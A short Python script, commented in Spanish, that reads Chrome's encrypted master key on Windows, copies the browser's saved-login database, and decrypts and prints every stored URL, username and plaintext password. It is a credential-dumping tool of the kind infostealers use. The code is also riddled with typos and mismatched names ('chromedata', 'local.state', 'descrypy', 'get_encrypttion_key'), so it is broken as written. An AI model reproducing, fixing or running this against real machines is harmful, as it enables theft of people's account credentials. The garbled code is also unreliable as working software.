#!/usr/bin/env python3

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

# pip3 installpycryptodome pypiwin32

def get_chrome_datetime(chromedate):
    """Retorna un objeto 'detetime.datetime' desde una fecha y hora en formato chrome
    Dado que 'chromedate' esta formateado como el numero de microsegundos desde enero de 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedata)

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",

    )

    with open(local_state_path, "r", encoding="utf-8") as f:
        local.state = f.read()
        local.state = json.loads(local_state)

    key = base64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] 


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.descrypy(password)[:-16].decode() 
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""



def main():
    key = get_encrypttion_key()

    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",

    )

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("""
            SELECT origin_url, username_value, password_value, date_create, date_last_used FROM logins ORDER BY data_last_used DESC
            """
    ) 

    for row in cursor.fetchall():
        url_de_origen = row[0]
        usuario = row[1]
        contrasena = decrypt_password(row[2], key) 
        fecha_de_creacion = row[3]
        fecha_de_ultimo_uso = row[4]

        if usuario or contrasena:
            print(f"URL: {url_de_origen}")
            print(f"Usuario: {usuario}")
            print(f"Contrasena: {contrasena}")
        else:
            continue
        if fecha_de_creacion != 86400000000 and fecha_de_creacion:
            print(f"Fecha de creacion: {str(get_chrome_datetime(fecha_de_creacion))}")
            

        if fecha_de_ultimo_uso != 86400000000 and fecha_de_ultimo_uso:
            print(f"Fecha de ultomo uso: {str(get_chrome_datetime(fecha_de_ultimo_uso))}")

        print("=" * 50)
    cursor.close()
    db.close()

    try:
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main() 
